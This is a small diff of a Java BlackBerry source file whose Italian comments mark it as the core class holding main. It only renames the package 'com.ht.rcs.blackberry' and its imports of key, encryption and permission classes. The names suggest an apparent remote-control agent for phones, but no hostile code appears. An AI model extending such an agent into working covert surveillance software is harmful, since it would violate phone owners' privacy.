@@ -6,19 +6,19 @@ c * Copyright (c) 2010 - 2010
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.DeviceInfo;
 
-import com.ht.rcs.blackberry.config.InstanceKeys323;
-import com.ht.rcs.blackberry.config.Keys;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.config.InstanceKeys323;
+import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 /**
  * Classe Core, contiene il main.
